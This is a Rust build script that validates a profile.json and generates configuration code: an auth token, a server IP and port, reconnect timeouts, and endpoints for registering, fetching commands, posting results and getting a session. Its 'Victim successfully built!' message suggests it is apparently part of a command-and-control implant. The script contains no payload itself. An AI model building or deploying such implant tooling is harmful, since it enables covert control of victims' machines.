// Build script

// This script will validate the profile.json and complain if it isn't valid.
// And will generate code for the crate to use that'll later be included with the
// include! macro.

use serde::{Deserialize, Serialize};
use serde_json::{self as sj, error::Category};
use std::io::ErrorKind;
use std::net::Ipv4Addr;
use std::path::Path;
use std::{env, fs, process};

#[derive(Debug, Serialize, Deserialize)]
struct Profile {
    auth_token: String,
    connect_ip: Ipv4Addr,
    port: u16,
    register: String,
    fetch_cmd: String,
    post_res: String,
    get_session: String,
    request_rate: u16,
    min_reconnect_timeout: u16,
    max_reconnect_timeout: u16,
    id_store_filename: String,
}

impl Profile {
    pub fn build(profile: &str) -> Profile {
        match sj::from_str(profile) {
            Ok(profile) => profile,
            Err(err) => handle_deserialize_errors(err),
        }
    }
}

fn handle_deserialize_errors(err: sj::Error) -> ! {
    match err.classify() {
        Category::Data => {
            eprintln!("(-) Invalid data in profile.json");
            process::exit(1);
        }
        Category::Syntax => {
            eprintln!("(-) Invalid JSON syntax in profile.json");
            process::exit(2);
        }
        Category::Eof => {
            eprintln!("(-) Unexpected EOF occurred when parsing profile.json");
            process::exit(3);
        }
        Category::Io => {
            eprintln!("(?) Failed to read or write bytes on profile.json.");
            process::exit(4);
        }
    }
}

fn generate_code(profile: &Profile) -> String {
    format!(
        r#"use std::net::Ipv4Addr;
use std::str::FromStr;

pub struct Config {{
    pub token: &'static str,
    pub connect_ip: Ipv4Addr,
    pub port: u16,
    pub max_reconnect_timeout: u16,
    pub min_reconnect_timeout: u16,
    pub request_rate: u16,
    pub id_store_filename: &'static str,
}}

impl Config {{
    pub fn new() -> Self {{
        Config {{
            token: "{}",
            connect_ip: Ipv4Addr::from_str("{}").unwrap(),
            port: {},
            min_reconnect_timeout: {},
            max_reconnect_timeout: {},
            request_rate: {},
            id_store_filename: "{}"
        }}
    }}
}}

pub struct ServerCommands {{
    pub register: &'static str,
    pub fetch_cmd: &'static str,
    pub post_res: &'static str,
    pub get_session: &'static str,
}}

impl ServerCommands {{
    pub fn new() -> Self {{
        ServerCommands {{
            register: "{}",
            fetch_cmd: "{}",
            post_res: "{}",
            get_session: "{}"
        }}
    }}
}}

pub struct EndPoints {{
    pub register: String,
    pub fetch_cmd: String,
    pub post_res: String,
    pub get_session: String 
}}

impl EndPoints {{
    pub fn new() -> Self {{
        let server_cmds = ServerCommands::new();
        let mut base_path = Self::base_path();
        // to avoid having paths starting with '//'
        base_path.pop().unwrap();
        EndPoints {{
            register: format!("{{}}{{}}", base_path, server_cmds.register),
            fetch_cmd: format!("{{}}{{}}", base_path, server_cmds.fetch_cmd),
            post_res: format!("{{}}{{}}", base_path, server_cmds.post_res),
            get_session: format!("{{}}{{}}", base_path, server_cmds.get_session),
        }}
    }}

    pub fn base_path() -> String {{
        let config = Config::new();
        format!("http://{{}}:{{}}/", config.connect_ip, config.port)
    }}
}}
    "#,
        profile.auth_token,
        profile.connect_ip.to_string(),
        profile.port,
        profile.min_reconnect_timeout,
        profile.max_reconnect_timeout,
        profile.request_rate,
        profile.id_store_filename,
        profile.register,
        profile.fetch_cmd,
        profile.post_res,
        profile.get_session,
    )
}

fn main() {
    // Get the profile.json file and read from it
    let profile = fs::read_to_string("profile.json").unwrap_or_else(|err| match err.kind() {
        ErrorKind::NotFound => {
            eprintln!("(-) 'profile.json' couldn't be found in the project root.");
            process::exit(5);
        }
        _ => {
            eprintln!("(?) Couldn't read from 'profile.json'");
            process::exit(6);
        }
    });
    let profile = Profile::build(&profile);
    let code = generate_code(&profile);

    let out_dir = env::var_os("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("profile.rs");

    fs::write(&dest_path, code).unwrap_or_else(|_| {
        eprintln!(
            "(?) Couldn't write generated code to {}",
            dest_path.display()
        );
        process::exit(7);
    });

    // Success message
    println!("(+) Victim successfully built!");

    // Hooks
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=profile.json");
}
